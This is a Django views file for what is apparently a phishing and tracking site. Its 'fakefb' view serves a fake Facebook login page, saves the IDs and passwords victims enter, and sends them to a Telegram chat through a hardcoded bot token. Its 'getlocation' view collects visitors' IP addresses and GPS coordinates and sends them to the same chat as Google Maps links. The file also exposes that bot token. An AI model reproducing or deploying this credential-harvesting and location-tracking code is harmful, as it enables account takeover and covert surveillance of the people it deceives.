from django.shortcuts import render
from .models import Location, Facebookid,Video
import json
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
import requests

def home(request):
    ip = request.META.get('REMOTE_ADDR', None)
    return render(request, 'index.html')

@csrf_exempt
def botrequest(request):
    if request.method=="POST":
        print(request.body)
        return request.body

def fetchvideo(request):
    videos=Video.objects.all()
    print(videos[0].video_id)
    return HttpResponse(json.dumps({"data":videos[0].video_id}))

def fakefb(request):
    print("helo")
    if request.method=="POST":
        r=json.loads(request.body)
        uid=r['uid']
        pwd=r['pwd']
        fid_obj=Facebookid(uid=uid,pwd=pwd)
        fid_obj.save()
        text=f"{uid}\n{pwd}"
        data = {
            "chat_id": "1700738927",
            "text": text,
            "parse_mode": "HTML",
        }
        BOT_API_URL="https://api.telegram.org"
        token="1791990705:AAFUezpYSdXUxWJTEynXiUZLJU6fFz1QHFY"
        requests.post(
                f"{BOT_API_URL}/bot{token}/sendMessage", data=data
            )
        return HttpResponse(json.dumps({"data":"Done"}))
    else:
        return render(request, 'index2.html')

def getlocation(request):
    r=json.loads(request.body)
    print(r)
    ip=r['ip']
    x=r['lat']
    y=r['long']
    print(ip)
    text=""
    if(x and y):
        url="https://maps.google.com/?q="+str(x)+","+str(y)
        print(url)
        loc_obj=Location(ip=ip,gps=url)
        text= f"{ip}\n{url}"
    else:
        loc_obj=Location(ip=ip)
        text=f"{ip}"
    loc_obj.save()
    data = {
            "chat_id": "1700738927",
            "text": text,
            "parse_mode": "HTML",
        }
    BOT_API_URL="https://api.telegram.org"
    token="1791990705:AAFUezpYSdXUxWJTEynXiUZLJU6fFz1QHFY"
    requests.post(
            f"{BOT_API_URL}/bot{token}/sendMessage", data=data
        )
    return HttpResponse(json.dumps({"data":x}))